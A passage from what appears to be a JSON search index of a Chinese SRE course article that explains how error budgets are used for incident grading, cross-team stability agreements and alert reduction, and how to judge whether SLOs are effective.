<p>\u540c\u65f6\uff0c\u5728\u8003\u8651\u5b9a\u9519\u8bef\u9884\u7b97\u7684\u65f6\u5019\uff0c\u8fd8\u8981\u8003\u8651\u5230\u90e8\u5206\u7279\u6b8a\u573a\u666f\uff0c\u8fd9\u4e2a\u8981\u6839\u636e\u4e1a\u52a1\u7279\u70b9\u6765\u5b9a\uff0c\u6bd4\u5982\u7535\u5546\u4f1a\u6709\u53cc11\u5927\u4fc3\u6d3b\u52a8\uff0c\u6709\u4e9b\u4ea7\u54c1\u8fd8\u8981\u8003\u8651\u6625\u665a\u4e92\u52a8\u6d3b\u52a8\u548c\u62a2\u7ea2\u5305\u6d3b\u52a8\uff0c\u751a\u81f3\u6709\u4e9b\u793e\u4ea4\u7c7b\u4ea7\u54c1\u8fd8\u8981\u8003\u8651\u5e94\u5bf9\u7a81\u53d1\u65b0\u95fb\u5bfc\u81f4\u7684\u8bbf\u95ee\u91cf\u6fc0\u589e\u95ee\u9898\u7b49\u7b49\uff0c\u8fd9\u4e9b\u573a\u666f\u5fc5\u7136\u56e0\u4e3a\u8bbf\u95ee\u91cf\u592a\u5927\u800c\u91c7\u53d6\u5f88\u591a\u9650\u6d41\u964d\u7ea7\u7684\u7b56\u7565\uff0c\u5bfc\u81f4\u66f4\u591a\u7684\u8bf7\u6c42\u5931\u8d25\u3002</p> <p>\u5982\u679c\u8fd9\u4e9b\u6d3b\u52a8\u6216\u4e8b\u4ef6\u662f\u53d1\u751f\u5728\u67d0\u4e2a\u8003\u6838\u5468\u671f\u5185\uff0c\u8fd9\u65f6\u8981\u8003\u8651\u653e\u5927\u9519\u8bef\u9884\u7b97\u7684\u503c\uff0c\u7279\u522b\u662f\u77ac\u65f6\u7684\u9519\u8bef\u6216\u5931\u8d25\uff0c\u5e94\u8be5\u8981\u6709\u66f4\u5927\u7684\u5bb9\u5fcd\u5ea6\uff0c\u7b80\u5355\u6765\u8bb2\u5c31\u662f\uff0c\u7279\u6b8a\u60c5\u51b5\u7279\u6b8a\u5904\u7406\uff0c\u5f53\u7136\u6700\u91cd\u8981\u7684\uff0c\u4e5f\u8981\u505a\u597d\u7279\u6b8a\u4fdd\u969c\u548c\u5e94\u5bf9\u5de5\u4f5c\u3002</p>"},{"location":"ops/50-sre-mogu-04/#2","title":"2.\u6545\u969c\u5b9a\u7ea7","text":"<p>\u7b2c\u4e8c\u79cd\u662f\u628a\u9519\u8bef\u9884\u7b97\u5e94\u7528\u5728\u6545\u969c\u5b9a\u7ea7\u4e2d\u3002\u6211\u4eec\u5224\u5b9a\u4e00\u4e2a\u95ee\u9898\u662f\u4e0d\u662f\u6545\u969c\uff0c\u6216\u8005\u8bc4\u4f30\u95ee\u9898\u5f71\u54cd\u7a0b\u5ea6\u5230\u5e95\u6709\u591a\u5927\uff0c\u9664\u4e86\u770b\u5f71\u54cd\u65f6\u957f\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u66f4\u5177\u64cd\u4f5c\u6027\u7684\u65b9\u6cd5\uff0c\u90a3\u5c31\u662f\u6309\u7167\u8be5\u95ee\u9898\u6d88\u8017\u7684\u9519\u8bef\u9884\u7b97\u6bd4\u4f8b\u6765\u8bc4\u5224\u3002</p> <p>\u6211\u5728\u300a\u8d75\u6210\u7684\u8fd0\u7ef4\u4f53\u7cfb\u7ba1\u7406\u8bfe\u300b\u7b2c28\u8bb2\u4e2d\u5206\u4eab\u8fc7\u8611\u83c7\u8857\u7684\u6545\u969c\u5b9a\u7ea7\u601d\u8def\uff0c\u6211\u4eec\u5c06\u6545\u969c\u7b49\u7ea7\u8bbe\u7f6e\u4e3a P0~P4 \u8fd9\u4e48 5 \u4e2a\u7ea7\u522b\uff0cP0 \u4e3a\u6700\u9ad8\uff0cP4 \u4e3a\u6700\u4f4e\u3002</p> <p>\u8fd8\u662f\u4ee5trade_cart\u8d2d\u7269\u8f66\u4e3a\u4f8b\uff0c\u7ed3\u5408P0\uff5eP4\u7684\u6545\u969c\u7b49\u7ea7\u8bbe\u7f6e\uff0c\u4e00\u8d77\u6765\u770b\u600e\u4e48\u5e94\u7528\u9519\u8bef\u9884\u7b97\u3002</p> <p>trade_cart\u8bf7\u6c42\u6210\u529f\u7387SLO\u5bf9\u5e94\u7684\u9519\u8bef\u9884\u7b97\u662f25,000\u6b21\uff0c\u5982\u679c\u4e00\u4e2a\u95ee\u9898\u4ea7\u751f\u7684\u9519\u8bef\u8bf7\u6c42\u6570\u8d85\u8fc7\u4e865000\u6b21\uff0c\u4e5f\u5c31\u662f\u9519\u8bef\u9884\u7b97\u4e00\u4e0b\u5c31\u88ab\u6d88\u8017\u638920%\u4ee5\u4e0a\uff0c\u8fd9\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u8fd9\u6b21\u6545\u969c\u5b9a\u4e3aP2\u7ea7\u3002\u4ee5\u6b64\u7c7b\u63a8\uff0c\u5982\u679c\u6d88\u801730%\u4ee5\u4e0a\uff0c\u6211\u4eec\u5b9a\u4e3aP1\u7ea7\uff0c\u6d88\u801750%\u4ee5\u4e0a\uff0c\u5b9a\u4e3aP0\u7ea7\u7b49\u7b49\u3002</p> <p></p> <p>\u5f53\u7136\uff0c\u6211\u8fd9\u91cc\u662f\u4e3e\u4f8b\uff0c\u5728\u771f\u6b63\u5b9e\u9645\u5de5\u4f5c\u4e2d\uff0c\u8fd9\u4e2a\u5177\u4f53\u6570\u503c\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u4e1a\u52a1\u60c5\u51b5\u548c\u5bb9\u5fcd\u5ea6\u6765\u5236\u5b9a\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u901a\u8fc7\u9519\u8bef\u9884\u7b97\u6765\u5b9a\u4e49\u6545\u969c\u7b49\u7ea7\u5c31\u53ef\u4ee5\u505a\u5230\u91cf\u5316\uff0c\u800c\u4e00\u65e6\u53ef\u4ee5\u88ab\u91cf\u5316\uff0c\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u6807\u51c6\u5316\uff0c\u6709\u4e86\u6807\u51c6\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u800c\u63a8\u8fdb\u8fbe\u6210\u5171\u8bc6\u3002</p>"},{"location":"ops/50-sre-mogu-04/#3","title":"3.\u7a33\u5b9a\u6027\u5171\u8bc6\u673a\u5236","text":"<p>\u7b2c\u4e09\u79cd\u662f\u7528\u9519\u8bef\u9884\u7b97\u6765\u786e\u5b9a\u7a33\u5b9a\u6027\u5171\u8bc6\u673a\u5236\u3002</p> <p>\u524d\u9762\u6211\u4eec\u7528\u9a7e\u7167\u8bb0\u5206\u6765\u7c7b\u6bd4\u9519\u8bef\u9884\u7b97\u3002\u73b0\u5728\u60f3\u60f3\uff0c\u5f53\u4f60\u53d1\u73b0\u81ea\u5df1\u53ea\u5269\u4e0b1\u5206\u7684\u65f6\u5019\uff0c\u4f60\u4f1a\u600e\u4e48\u529e\uff1f\u5f00\u8f66\u80af\u5b9a\u4f1a\u975e\u5e38\u5c0f\u5fc3\uff0c\u6bd4\u5982\u8bf4\u6162\u901f\u884c\u9a76\uff0c\u4e25\u683c\u9075\u5b88\u4ea4\u901a\u89c4\u5219\uff0c\u751a\u81f3\u662f\u4e0d\u5f00\u8f66\uff0c\u8fd9\u4e9b\u884c\u4e3a\u90fd\u662f\u56f4\u7ed5\u201c\u9a7e\u7167\u8bb0\u5206\u53ea\u52691\u5206\u201d\u8fd9\u4e2a\u7ed3\u679c\u6765\u505a\u7684\u3002</p> <p>\u540c\u6837\uff0c\u5728\u6211\u4eec\u7cfb\u7edf\u7a33\u5b9a\u6027\u4fdd\u969c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4e5f\u4f1a\u6839\u636e\u5269\u4f59\u9884\u7b97\u7684\u60c5\u51b5\uff0c\u6765\u5236\u5b9a\u76f8\u5e94\u7684\u884c\u52a8\u63aa\u65bd\uff0c\u6765\u907f\u514d\u6211\u4eec\u7684\u7a33\u5b9a\u6027\u76ee\u6807\uff0c\u4e5f\u5c31\u662fSLO\u8fbe\u4e0d\u6210\u3002</p> <p>\u90a3\u4e48\uff0c\u5f53\u9519\u8bef\u9884\u7b97\u5904\u4e8e\u4e0d\u540c\u72b6\u6001\u65f6\uff0c\u6211\u4eec\u4e00\u822c\u90fd\u4f1a\u91c7\u53d6\u54ea\u4e9b\u5e38\u89c1\u63aa\u65bd\u5462\uff1f\u8fd9\u91cc\u6211\u7ed9\u4f60\u4ecb\u7ecd\u4e24\u4e2a\u6307\u5bfc\u539f\u5219\u3002</p> <p>\u7b2c\u4e00\uff0c\u5269\u4f59\u9884\u7b97\u5145\u8db3\u6216\u672a\u6d88\u8017\u5b8c\u4e4b\u524d\uff0c\u5bf9\u95ee\u9898\u7684\u53d1\u751f\u8981\u6709\u5bb9\u5fcd\u5ea6\u3002</p> <p>\u6bd4\u59824\u5468\u7684\u4e00\u4e2a\u5468\u671f\u5185\uff0c\u5982\u679c\u9519\u8bef\u9884\u7b97\u6ca1\u6709\u88ab\u6d88\u8017\u5b8c\uff0c\u6211\u4eec\u5f3a\u8c03\u5373\u4f7f\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\uff0c\u751a\u81f3\u662f\u6545\u969c\uff0c\u6211\u4eec\u662f\u8981\u5bb9\u5fcd\u7684\u3002</p> <p>\u6bd4\u5982\uff0c\u7f51\u7edc\u6296\u52a8\u6216\u8bbe\u5907\u77ac\u65f6\u5207\u6362\u5bfc\u81f4\u4e86\u6781\u77ed\u6682\u7684\u7cfb\u7edf\u4e0d\u7a33\u5b9a\uff0c\u4f46\u662f\u6709\u6781\u5c11\u4e00\u90e8\u5206\u5ba2\u6237\u53cd\u9988\u4e86\uff0c\u4e5f\u53ef\u80fd\u9886\u5bfc\u6216\u4e1a\u52a1\u4f7f\u7528\u65f6\u9047\u5230\u4e86\uff0c\u7ed3\u679c\u6280\u672f\u540c\u5b66\u5c31\u88ab\u6295\u8bc9\u7cfb\u7edf\u6216\u4e1a\u52a1\u4e0d\u7a33\u5b9a\uff0c\u7136\u540e\u5c31\u8981\u653e\u4e0b\u624b\u5934\u7684\u5de5\u4f5c\u53bb\u6392\u67e5\u95ee\u9898\uff0c\u540e\u7eed\u8fd8\u8981\u82b1\u5927\u91cf\u7684\u65f6\u95f4\u53bb\u590d\u76d8\u603b\u7ed3\u548c\u6c47\u62a5\u7b49\u7b49\u3002</p> <p>\u8fd9\u4e2a\u573a\u666f\u53d1\u751f\u7684\u539f\u56e0\u5c31\u662f\u6211\u5728\u5f00\u7bc7\u8bcd\u4e2d\u63d0\u5230\u7684\uff0c\u6bcf\u4e2a\u89d2\u8272\u5bf9\u95ee\u9898\u548c\u6545\u969c\u7684\u5b9a\u4e49\u4ee5\u53ca\u7406\u89e3\u662f\u4e0d\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u51fa\u73b0\u95ee\u9898\u7684\u65f6\u5019\uff0c\u4efb\u4f55\u4eba\u3001\u4efb\u4f55\u89d2\u8272\u90fd\u53ef\u4ee5\u51ed\u4e2a\u4eba\u611f\u89c9\u5bf9\u95ee\u9898\u5f71\u54cd\u7a0b\u5ea6\u8fdb\u884c\u8bc4\u5224\u3002</p> <p>\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u4f60\u4e00\u822c\u662f\u600e\u4e48\u5e94\u5bf9\u7684\uff1f\u4e0d\u77e5\u9053\u8be5\u542c\u8c01\u7684\uff1f\u8fd8\u662f\u5148\u542c\u4e00\u4e2a\uff0c\u4e00\u5934\u624e\u8fdb\u53bb\u6392\u67e5\u95ee\u9898\uff1f</p> <p>\u73b0\u5728\uff0c\u4f60\u6709\u4e86SLO\u548c\u9519\u8bef\u9884\u7b97\u7684\u5224\u65ad\u6807\u51c6\uff0c\u5c31\u6709\u4e86\u660e\u786e\u7684\u5e94\u5bf9\u601d\u8def\u3002\u5982\u679c\u9884\u7b97\u5145\u8db3\uff0c\u4e14\u5355\u6b21\u95ee\u9898\u5e76\u6ca1\u6709\u9020\u6210\u5927\u91cf\u635f\u8017\uff0c\u90a3\u4e48\u8fd9\u6b21\u95ee\u9898\u5c31\u4e0d\u5e94\u8be5\u88ab\u6295\u8bc9\uff0c\u4e5f\u4e0d\u7528\u4ee5\u9ad8\u4f18\u5148\u7ea7\u54cd\u5e94\uff0c\u5b83\u5e94\u8be5\u5f97\u5230\u5bb9\u5fcd\u7684\u3002</p> <p>\u7b2c\u4e8c\uff0c\u5269\u4f59\u9884\u7b97\u6d88\u8017\u8fc7\u5feb\u6216\u5373\u5c06\u6d88\u8017\u5b8c\u4e4b\u524d\uff0cSRE\u6709\u6743\u4e2d\u6b62\u548c\u62d2\u7edd\u4efb\u4f55\u7ebf\u4e0a\u53d8\u66f4\u3002</p> <p>\u4e3a\u4ec0\u4e48\u8fd9\u4e48\u8bf4\u5462\uff1f\u56e0\u4e3a\u6b64\u65f6\u7684\u60c5\u51b5\u5df2\u7ecf\u8bf4\u660e\u7cfb\u7edf\u7a33\u5b9a\u51fa\u73b0\u4e86\u5f88\u5927\u95ee\u9898\uff0c\u4e0d\u80fd\u518d\u8ba9\u5b83\u201c\u5e26\u75c5\u5de5\u4f5c\u201d\u3002\u540c\u6837\uff0c\u8fd9\u65f6\u7684\u4e1a\u52a1\u5f00\u53d1\u56e2\u961f\uff0c\u4e5f\u6709\u6743\u62d2\u7edd\u65b0\u7684\u9700\u6c42\uff0c\u4ed6\u4eec\u9996\u8981\u7684\u4e8b\u60c5\uff0c\u5e94\u8be5\u662f\u8ddfSRE\u4e00\u8d77\u89e3\u51b3\u5f71\u54cd\u7a33\u5b9a\u6027\u7684\u95ee\u9898\uff0c\u76f4\u81f3\u95ee\u9898\u89e3\u51b3\uff0c\u4e14\u7b49\u5230\u4e0b\u4e00\u4e2a\u5468\u671f\u6709\u4e86\u65b0\u7684\u9519\u8bef\u9884\u7b97\u540e\uff0c\u518d\u6062\u590d\u6b63\u5e38\u53d8\u66f4\u8282\u594f\u3002</p> <p>\u4ece\u4e0a\u9762\u8fd9\u4e24\u4e2a\u539f\u5219\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8ddf\u9a7e\u7167\u6263\u5206\u89e6\u53d1\u7684\u884c\u52a8\u4e0d\u540c\uff0c\u4fdd\u969c\u7a33\u5b9a\u6027\u7684\u884c\u52a8\u4e0d\u662f\u5355\u72ec\u67d0\u4e00\u65b9\u5c31\u53ef\u4ee5\u5b8c\u6210\u7684\uff0c\u5b83\u9700\u8981\u591a\u65b9\u5171\u540c\u8ba4\u53ef\u5e76\u613f\u610f\u914d\u5408\u624d\u80fd\u771f\u6b63\u6267\u884c\u5230\u4f4d\u3002</p> <p>\u6240\u4ee5\uff0c\u4f60\u5728\u5236\u5b9aSLO\u548c\u9519\u8bef\u9884\u7b97\u7b56\u7565\u7684\u8fc7\u7a0b\u4e2d\uff0c\u8981\u6709\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u52a8\u4f5c\uff0c\u5c31\u662f\u786e\u4fdd\u4e0e\u8fd0\u8425\u3001\u4ea7\u54c1\u548c\u5f00\u53d1\u8fbe\u6210\u4e00\u81f4\uff0c\u5404\u65b9\u8981\u8ba4\u53ef\u8fd9\u4e2a\u7b56\u7565\uff0c\u5e76\u4e14\u5f53\u7b56\u7565\u88ab\u89e6\u53d1\u65f6\uff0c\u5927\u5bb6\u4e5f\u4f1a\u4e25\u683c\u9075\u5b88\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u6d89\u53ca\u5230\u8de8\u56e2\u961f\u6c9f\u901a\u5171\u8bc6\u673a\u5236\u3002\u4ece\u63a8\u884c\u7684\u89d2\u5ea6\u6765\u8bb2\uff0c\u5efa\u7acb\u7a33\u5b9a\u6027\u5171\u8bc6\u673a\u5236\u4e00\u5b9a\u662fTop-Down\uff0c\u4e5f\u5c31\u662f\u81ea\u4e0a\u800c\u4e0b\uff0c\u81f3\u5c11\u8981\u4ece\u6280\u672fVP\u6216CTO\u7684\u89d2\u5ea6\u53bb\u63a8\u884c\uff0c\u800c\u4e14\u5f53\u6709\u610f\u89c1\u4e0d\u4e00\u81f4\u7684\u60c5\u51b5\u51fa\u73b0\u65f6\uff0c\u8fd8\u8981\u9010\u6b65\u4e0a\u5347\uff0c\u76f4\u81f3CTO\u89d2\u5ea6\u6765\u505a\u51b3\u7b56\u3002\u5173\u4e8e\u8fd9\u4e00\u70b9\uff0c\u4f60\u9700\u8981\u7279\u522b\u6ce8\u610f\uff0c\u4e00\u5b9a\u8981\u81ea\u4e0a\u800c\u4e0b\u63a8\u8fdb\u5468\u8fb9\u56e2\u961f\u6216\u5229\u76ca\u65b9\u8fbe\u6210\u5171\u8bc6\u3002</p>"},{"location":"ops/50-sre-mogu-04/#4","title":"4.\u57fa\u4e8e\u9519\u8bef\u9884\u7b97\u7684\u544a\u8b66","text":"<p>\u7b2c\u56db\u79cd\u662f\u628a\u9519\u8bef\u9884\u7b97\u5e94\u7528\u5728\u544a\u8b66\u4e2d\u3002</p> <p>\u65e5\u5e38\u5de5\u4f5c\u4e2d\uff0c\u4f5c\u4e3a\u4e00\u7ebf\u7684\u5de5\u7a0b\u5e08\uff0c\u4f60\u80af\u5b9a\u8981\u63a5\u6536\u5927\u91cf\u7684\u544a\u8b66\u77ed\u4fe1\uff0c\u4f46\u662f\u8fd9\u4e9b\u544a\u8b66\u91cc\u9762\u5f88\u5927\u4e00\u90e8\u5206\u90fd\u662f\u6ca1\u6709\u5b9e\u9645\u610f\u4e49\u7684\u3002\u4e3a\u4ec0\u4e48\u8fd9\u4e48\u8bf4\u5462\uff1f\u56e0\u4e3a\u5b83\u4eec\u6ca1\u6709\u884c\u52a8\u6307\u5bfc\u610f\u4e49\uff0c\u6bd4\u5982CPU\u4f7f\u7528\u738780%\u3001\u6210\u529f\u7387\u4f4e\u4e8e95%\u3001\u65f6\u5ef6\u8d85\u8fc780ms\u7b49\u7b49\uff0c\u8fd9\u6837\u7684\u544a\u8b66\u53ea\u662f\u544a\u8bc9\u6211\u4eec\u6709\u95ee\u9898\u3001\u6709\u5f02\u5e38\uff0c\u4f46\u662f\u5426\u9700\u8981\u9ad8\u4f18\u5148\u7ea7\u9a6c\u4e0a\u5904\u7406\uff0c\u8fd8\u662f\u8bf4\u53ef\u4ee5\u5148\u653e\u4e00\u653e\u3001\u8fc7\u4e00\u4f1a\u518d\u5904\u7406\u5462\uff1f\u4f60\u53ef\u80fd\u5e76\u6ca1\u6709\u529e\u6cd5\u5224\u65ad\u3002</p> <p>\u8fd9\u6837\u7684\u544a\u8b66\uff0c\u63a5\u6536\u7684\u6b21\u6570\u591a\u4e86\uff0c\u5c31\u4f1a\u53d8\u6210\u201c\u72fc\u6765\u4e86\u201d\uff0c\u4f60\u81ea\u5df1\u53d8\u5f97\u8b66\u60d5\u6027\u4e0d\u9ad8\uff0c\u5f53\u6545\u969c\u771f\u7684\u53d1\u751f\u65f6\uff0c\u4f60\u4e5f\u6ca1\u6cd5\u5feb\u901f\u54cd\u5e94\u3002</p> <p>\u90a3\u6211\u4eec\u5e94\u5f53\u5982\u4f55\u505a\u544a\u8b66\u6536\u655b\u5462\uff1f\u4ece\u6211\u7684\u7ecf\u9a8c\u770b\uff0c\u6709\u4e24\u4e2a\u89e3\u51b3\u529e\u6cd5\u3002</p> <ul> <li>\u7b2c\u4e00\u4e2a\uff0c\u76f8\u540c\u76f8\u4f3c\u544a\u8b66\uff0c\u5408\u5e76\u540e\u53d1\u9001\uff0c\u6bd4\u5982\u540c\u4e00\u5e94\u7528\u96c6\u7fa4\u5185\u540c\u4e00\u65f6\u95f4\u5185\uff0c\u540c\u4e00\u5f02\u5e38\u544a\u8b66\uff0c\u5c31\u5148\u5408\u5e76\uff0c\u5bf9\u5916\u53ea\u53d1\u9001\u4e00\u6761\uff0c\u8fd9\u79cd\u6bd4\u8f83\u7b80\u5355\u76f4\u63a5\u3002</li> <li>\u7b2c\u4e8c\u4e2a\uff0c\u57fa\u4e8e\u9519\u8bef\u9884\u7b97\u6765\u505a\u544a\u8b66\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ea\u5173\u6ce8\u5bf9\u7a33\u5b9a\u6027\u9020\u6210\u5f71\u54cd\u7684\u544a\u8b66\uff0c\u6bd4\u5982\u6211\u4eec\u524d\u9762\u63d0\u5230\u7684\uff0c\u5f53\u5355\u6b21\u95ee\u9898\u6d88\u8017\u7684\u9519\u8bef\u9884\u7b97\u8fbe\u523020%\u621630%\u7b49\u67d0\u4e00\u9608\u503c\u65f6\uff0c\u5c31\u610f\u5473\u7740\u95ee\u9898\u975e\u5e38\u4e25\u91cd\u4e86\uff0c\u8fd9\u79cd\u544a\u8b66\u4fe1\u606f\u4e00\u65e6\u6536\u5230\uff0c\u5c31\u8981\u9a6c\u4e0a\u505a\u51fa\u54cd\u5e94\u3002\u8fd9\u6837\u544a\u8b66\u6570\u91cf\u4e0d\u591a\uff0c\u65e2\u8fbe\u5230\u4e86\u6536\u655b\u6548\u679c\uff0c\u53c8\u975e\u5e38\u7cbe\u51c6\u3002</li> </ul> <p>\u57fa\u4e8e\u9519\u8bef\u9884\u7b97\u7684\u544a\u8b66\u5c31\u4f1a\u6d89\u53ca\u5230AIOps\u76f8\u5173\u7684\u9886\u57df\uff0c\u6211\u5c31\u4e0d\u518d\u5c55\u5f00\u8bb2\u4e86\u3002\u8fd9\u91cc\u6211\u5206\u4eab\u4e00\u4e2a\u94fe\u63a5\uff0c\u8c37\u6b4c\u57fa\u4e8eSLO\u548c\u9519\u8bef\u9884\u7b97\u7684\u51e0\u79cd\u544a\u8b66\u7b97\u6cd5\uff0c\u4f60\u53ef\u4ee5\u5b66\u4e60\u4e0b\u91cc\u9762\u7528\u5230\u7684\u65b9\u6cd5\u3002</p> <p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u57fa\u4e8e\u9519\u8bef\u9884\u7b97\u76844\u4e2a\u5e94\u7528\u573a\u666f\u5c31\u4ecb\u7ecd\u5b8c\u4e86\uff0c\u6211\u4eec\u5c0f\u7ed3\u4e00\u4e0b\u3002\u6211\u4eec\u5c06SLO\u53cd\u5411\u63a8\u5bfc\u51fa\u4e86\u9519\u8bef\u9884\u7b97\uff0c\u4e3a\u4e86\u8ba9\u9519\u8bef\u9884\u7b97\u7684\u8b66\u793a\u6548\u679c\u66f4\u663e\u8457\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u71c3\u5c3d\u56fe\u7684\u65b9\u5f0f\u5448\u73b0\u51fa\u6765\uff1b\u540c\u65f6\uff0c\u8fd8\u53ef\u4ee5\u6839\u636e\u6bcf\u6b21\u95ee\u9898\u6d88\u8017\u7684\u9519\u8bef\u9884\u7b97\u6bd4\u4f8b\u6765\u5236\u5b9a\u6545\u969c\u7b49\u7ea7\uff0c\u8fd9\u6837\u5c31\u505a\u5230\u4e86\u5bf9\u6545\u969c\u7684\u91cf\u5316\u7ba1\u7406\uff1b\u6709\u4e86\u91cf\u5316\u6570\u636e\uff0c\u5728\u5411\u5468\u8fb9\u56e2\u961f\u548c\u4e0a\u7ea7\u9886\u5bfc\u6c9f\u901a\u65f6\uff0c\u4e5f\u4f1a\u663e\u5f97\u6709\u7406\u6709\u636e\uff1b\u6700\u540e\uff0c\u57fa\u4e8e\u9519\u8bef\u9884\u7b97\u6211\u4eec\u8fd8\u53ef\u4ee5\u505a\u5230\u544a\u8b66\u6536\u655b\uff0c\u8ba9\u544a\u8b66\u66f4\u51c6\u786e\uff0c\u66f4\u5177\u5907\u884c\u52a8\u6307\u5bfc\u4ef7\u503c\u3002</p> <p>\u65e2\u7136\u6211\u4eec\u5236\u5b9a\u4e86SLO\uff0c\u63a8\u5bfc\u51fa\u4e86\u9519\u8bef\u9884\u7b97\uff0c\u4e5f\u505a\u597d\u4e86\u76f8\u5e94\u7684\u7b56\u7565\uff0c\u90a3\u6211\u4eec\u5236\u5b9a\u7684\u8fd9\u4e9b\u76ee\u6807\u548c\u89c4\u5219\u662f\u5426\u6709\u6548\u679c\u5462\uff1f\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u6765\u8bc4\u4ef7\u5b83\u4eec\u7684\u6709\u6548\u6027\uff0c\u53c8\u5e94\u8be5\u600e\u4e48\u8fdb\u4e00\u6b65\u8fed\u4ee3\u4f18\u5316\u5462\uff1f</p> <p>\u4e0b\u9762\u6211\u4eec\u5c31\u4e00\u8d77\u6765\u770b\u4e00\u4e0b\u5982\u4f55\u8861\u91cfSLO\u7684\u6709\u6548\u6027\u3002</p>"},{"location":"ops/50-sre-mogu-04/#slo","title":"\u5982\u4f55\u8861\u91cfSLO\u7684\u6709\u6548\u6027\uff1f","text":"<p>\u8861\u91cfSLO\u53ca\u9519\u8bef\u9884\u7b97\u7b56\u7565\u662f\u5426\u6709\u6548\uff0c\u5176\u5b9e\u5c31\u662f\u770b\u5b9e\u9645\u8fd0\u884c\u540e\uff0c\u662f\u5426\u771f\u7684\u80fd\u8fbe\u5230\u6211\u4eec\u7684\u671f\u671b\u3002\u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u4e09\u4e2a\u5173\u952e\u7ef4\u5ea6\u6765\u770b\u3002</p> <ul> <li> <p>SLO\u8fbe\u6210\u60c5\u51b5\u3002\u6211\u4eec\u7528\u8fbe\u6210\uff08Met\uff09\uff0c\u6216\u672a\u8fbe\u6210\uff08Missed\uff09\u6765\u8868\u793a\u3002</p> </li> <li> <p>\u201c\u4eba\u8089\u201d\u6295\u5165\u7a0b\u5ea6\u3002\u82f1\u6587\u8868\u793a\u4e3aToil\uff0c\u8fd9\u91cc\u7528\u5f62\u8c61\u4e00\u70b9\u7684\u201c\u4eba\u8089\u201d\u6295\u5165\u4f5c\u4e3a\u5b83\u7684\u8bd1\u610f\uff0c\u6cdb\u6307\u9700\u8981\u5927\u91cf\u4eba\u5de5\u6295\u5165\u3001\u91cd\u590d\u3001\u7e41\u7410\u4e14\u6ca1\u6709\u592a\u591a\u4ef7\u503c\u7684\u4e8b\u60c5\u3002\u6211\u4eec\u7528\u6295\u5165\u7a0b\u5ea6\u9ad8\uff08High\uff09\u548c\u4f4e\uff08Low\uff09\u6765\u8868\u793a\u3002</p> </li> <li> <p>\u7528\u6237\u6ee1\u610f\u5ea6\u3002\u82f1\u6587\u5c31\u662fCustomer Satisfaction\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u7528\u6237\u611f\u53d7\u548c\u4f53\u9a8c\u5982\u4f55\u3002\u8fd9\u4e2a\u4fe1\u606f\u53ef\u4ee5\u901a\u8fc7\u771f\u5b9e\u548c\u865a\u62df\u6e20\u9053\u83b7\u5f97\u3002\u771f\u5b9e\u6e20\u9053\u5982\u5ba2\u670d\u6295\u8bc9\u3001\u5ba2\u6237\u8bbf\u8c08\u548c\u8206\u60c5\u76d1\u63a7\u83b7\u53d6\uff1b\u865a\u62df\u6e20\u9053\u5982\u771f\u673a\u6a21\u62df\u62e8\u6d4b\u3002\u6211\u4eec\u7528\u6ee1\u610f\u5ea6\u9ad8\uff08High\uff09\u548c\u4f4e\uff08Low\uff09\u6765\u8868\u793a\u3002</p> </li> </ul> <p>\u603b\u51713\u4e2a\u7ef4\u5ea6\uff0c\u6bcf\u4e2a\u7ef4\u5ea6\u67092\u79cd\u60c5\u51b5\uff0c\u7ec4\u5408\u8d77\u6765\u5c31\u662f8\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u76f4\u63a5\u5f15\u7528Google\u7ed9\u51fa\u7684\u56fe\u8868\u548c\u5efa\u8bae\u3002</p> <p></p> <p>\u9488\u5bf9\u8fd98\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u5206\u522b\u7ed9\u51fa\u5bf9\u5e94\u7b56\u7565\u3002\u603b\u7ed3\u4e00\u4e0b\uff0c\u5e94\u5bf9\u65b9\u5f0f\u53ef\u4ee5\u5206\u4e3a3\u7c7b\u3002</p> <p>\u7b2c\u4e00\u7c7b\uff0c\u6536\u7d27SLO\u3002</p> <p>\u8fd9\u4e2a\u65f6\u5019\u5c31\u662f\u76ee\u6807\u5b9a\u5f97\u592a\u4f4e\u4e86\uff0c\u6bd4\u5982SLO\u8fbe\u6210\uff08Met\uff09\uff0c\u4f46\u662f\u7528\u6237\u4e0d\u6ee1\u610f\uff08Low\uff09\u3002\u4f1a\u6709\u4ec0\u4e48\u540e\u679c\u5462\uff1f\u8981\u4e48\u6295\u8bc9\u591a\uff0c\u8981\u4e48\u5230\u5904\u5410\u69fd\u3002\u8fd9\u5c31\u8868\u793a\u6211\u4eec\u7684SLO\u8bbe\u5b9a\u5f97\u592a\u5bb9\u6613\u8fbe\u6210\uff0c\u6ca1\u6709\u53cd\u9988\u771f\u5b9e\u7684\u8fd0\u884c\u72b6\u51b5\u3002</p> <p>\u7b2c\u4e8c\u7c7b\uff0c\u653e\u5bbdSLO\u3002</p> 